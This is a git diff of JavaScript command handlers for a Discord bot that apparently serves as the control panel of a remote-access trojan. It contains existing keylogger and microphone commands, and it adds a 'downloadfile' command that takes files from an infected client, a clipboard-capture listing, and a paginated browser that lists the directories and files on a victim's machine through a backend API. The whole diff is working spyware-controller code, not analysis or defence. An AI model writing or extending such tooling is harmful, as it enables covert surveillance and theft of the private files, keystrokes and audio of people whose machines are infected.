@@ -50,6 +50,7 @@ export const handleSendCommand = async (interaction) => {
     const clientId = interaction.options.getString('client_id');
     const command = interaction.options.getString('command');
     const duration = interaction.options.getInteger('duration') || 10;
+    const file_path = interaction.options.getString('file_path');
 
     await interaction.deferReply({ ephemeral: true });
 
@@ -62,6 +63,13 @@ export const handleSendCommand = async (interaction) => {
         data.params = { duration };
     } else if ((command === 'microphone' || command === 'keylogger') && !duration) {
         await interaction.editReply(`La durée est requise pour la commande '${command}'.`);
+        return;
+    }
+
+    if (command === 'downloadfile' && file_path) {
+        data.params = { file_path };
+    } else if (command === 'downloadfile' && !file_path) {
+        await interaction.editReply(`Le chemin du fichier est requis pour la commande '${command}'.`);
         return;
     }
 
@@ -153,8 +161,11 @@ export const handleListDataCommand = async (interaction) => {
             case 'keylogger':
                 content = "Selectionner un client pour voir les enregistrements du clavier :";
                 break;
-            case 'papier':
+            case 'clipboard':
                 content = "Selectionner un client pour voir les presses récupérées :";
+                break;
+            case 'downloadfile':
+                content = "Selectionner un client pour voir les fichiers téléchargés :";
                 break;
 
         }
@@ -166,3 +177,104 @@ export const handleListDataCommand = async (interaction) => {
         await interaction.editReply("Erreur lors de la récupération des clients.");
     }
 }
+
+export const handleListDirectoriesClientCommand = async (interaction) => {
+    const clientId = interaction.options.getString('client_id');
+    const dir_path = interaction.options.getString('dir_path');
+    await interaction.deferReply({ ephemeral: true });
+
+    const url = `${API_BASE_URL}/directory/client/${clientId}`;
+    try {
+        const response = await executeRequestWithTokenRefresh(url, { method: 'POST', data: { dir_path } });
+        const directories_and_files = response.data;
+
+        if (directories_and_files.length === 0) {
+            await interaction.editReply("📁 Aucun répertoire trouvé pour ce client.");
+            return;
+        }
+
+        const itemsPerPage = 10;
+        let currentPage = 0;
+        const totalPages = Math.ceil(directories_and_files.length / itemsPerPage);
+
+        const generateEmbed = (page) => {
+            const start = page * itemsPerPage;
+            const end = start + itemsPerPage;
+            const embedDescription = directories_and_files.slice(start, end).map(item => {
+                if (item.type === 'dir') {
+                    return `📂 **${item.name}**`;
+                } else if (item.type === 'file') {
+                    return `📄 **${item.name}**`;
+                }
+            }).join('\n\n');
+
+            return createEmbed(
+                `Contenu du client ${clientId} - ${dir_path} (Page ${page + 1}/${totalPages})`,
+                embedDescription,
+                [],
+                '#024b7a'
+            );
+        };
+
+        const embed = generateEmbed(currentPage);
+
+        const previousButton = new ButtonBuilder()
+            .setCustomId('previous')
+            .setLabel('Précédent')
+            .setStyle(1)
+            .setDisabled(currentPage === 0);
+
+        const nextButton = new ButtonBuilder()
+            .setCustomId('next')
+            .setLabel('Suivant')
+            .setStyle(1)
+            .setDisabled(currentPage === totalPages - 1);
+
+        const components = [new ActionRowBuilder().addComponents(previousButton, nextButton)];
+
+        await interaction.editReply({ embeds: [embed], components });
+
+        const message = await interaction.fetchReply();
+        const filter = i => ['previous', 'next'].includes(i.customId) && i.user.id === interaction.user.id;
+        const collector = message.createMessageComponentCollector({ filter, time: 60000 });
+
+        collector.on('collect', async i => {
+            if (i.customId === 'next' && currentPage < totalPages - 1) {
+                currentPage++;
+            } else if (i.customId === 'previous' && currentPage > 0) {
+                currentPage--;
+            }
+
+            const newEmbed = generateEmbed(currentPage);
+
+            const newPreviousButton = new ButtonBuilder()
+                .setCustomId('previous')
+                .setLabel('Précédent')
+                .setStyle(1)
+                .setDisabled(currentPage === 0);
+
+            const newNextButton = new ButtonBuilder()
+                .setCustomId('next')
+                .setLabel('Suivant')
+                .setStyle(1)
+                .setDisabled(currentPage === totalPages - 1);
+
+            const newComponents = [new ActionRowBuilder().addComponents(newPreviousButton, newNextButton)];
+
+            await i.update({ embeds: [newEmbed], components: newComponents });
+        });
+
+        collector.on('end', async () => {
+            try {
+                await interaction.editReply({ content: 'La pagination a expiré.', components: [] });
+            } catch (error) {
+                if (error.code !== 10008) { // Ignore "Unknown Message" errors
+                    console.error("Erreur lors de la suppression des composants", error);
+                }
+            }
+        });
+    } catch (error) {
+        console.error("Erreur lors de la récupération des répertoires", error);
+        await interaction.editReply("Erreur lors de la récupération des répertoires.");
+    }
+};
